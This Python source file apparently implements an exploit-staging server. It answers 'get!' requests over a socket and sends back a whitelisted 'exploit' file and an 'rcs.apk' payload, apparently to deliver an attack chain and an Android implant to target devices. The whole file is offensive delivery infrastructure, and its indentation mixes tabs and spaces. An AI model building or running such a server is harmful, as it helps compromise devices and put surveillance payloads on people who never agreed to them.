import socket
import string
import struct
import os
import sys
import logging

# Download protocol:
# get![file_name]
# file_name have to be inside the whitelist

def start_exp_server(s, exploit, apk):
    logging.info('Starting exploit server')
    # Files whitelist
    # name: open file-like object
    wl = {
        "exploit": exploit,
	"rcs.apk": apk
    }

    # Message handling
    while True:
        data = s.recv(1025)
        if len(data) == 0:
            s.close()
            logging.info('Connection closed.')
            return
        # Parse received request
        cmd = data.split('!')

        if cmd[0] == 'get':
            try:
                dw_file = cmd[1].strip()
                logging.info('Received get for {}'.format(dw_file))

                # Whitelist check
                fp = wl[dw_file]
		fp.seek(0, 2)
		size = fp.tell()
		fp.seek(0, 0)
		s.sendall(struct.pack("!I", size))
		logging.info('Sending file {}..'.format(dw_file))
		data = fp.read()
		s.sendall(data)

	    except:
                logging.debug('Something wrong handling get message... skipping')
                return

